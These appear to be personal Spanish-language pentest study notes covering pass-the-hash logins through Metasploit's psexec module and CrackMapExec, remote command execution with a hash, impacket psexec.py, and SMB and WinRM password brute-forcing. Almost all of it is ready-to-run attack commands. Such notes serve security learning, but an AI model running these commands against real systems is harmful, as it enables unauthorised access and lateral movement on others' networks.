# Crackmapexec

Propietario: Adrian Gisbert Cabello

Para conectarnos mediante una sesión meterpreter con la técnica Pass-The-Hash Attack, y así pivotar a otro usuario sin tener credenciales en texto plano pero si en formato hash, abrimos metasploit y buscamos `search psexec`, y usamos el módulo `use exploit/windows/smb/psexec`

`set SMBUser Administrator`

`set SMBPass aadjrkv3fgdsjjkdbk584gd:e3cf5g89rtdsdfg5t5h5` (Password HASH)

`set target Command` (Para ver todos los targets `set target`) podemos usar `set target Native \upload` para subir un payload

Si queremos conectarnos a través de crackmapexec con el password hash: `crackmapexec smb 192.168.X.X -u Administrator -H ¨HASH¨`

Podemos ejecutar comandos con el parámetro -x: `crackmapexec smb 192.168.X.X -u Administrator -H ¨HASH¨` `-x ¨ipconfig¨`

Para entrar mediante fuerza bruta a través de smb podemos usar crackmapexec:

`crackmapexec smb 10.0.2.4 -u credentials.txt -p credentials.txt --continue-on-success`

La mejor manera para logearse por SMB es usando la herramienta ***psexec***, podemos hacerlo a través de terminal o a través de metasploit:

- A través de terminal:
    
    Localizamos la ruta del archivo [***psexec.py***](http://psexec.py) con el comando ***locate*** → `locate psexec.py` → una vez encontrado lo ejecutamos `/usr/share/doc/python3-impacket/examples/psexec.py (A/a)dministrator@192.168.X.X` Donde el administrator, podemos poner cualquier usuario → ponemos la contraseña
    
- A través de metasploit:
    
    Ejecutamos metasploit y buscamos:		`search psexec type:exploit`		→		con el `show options` rellenamos los parámetros que nos pida el exploit
    

Para hacer un ataque de fuerza bruta a winrm: `crackmapexec winrm 192.168.X.X -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`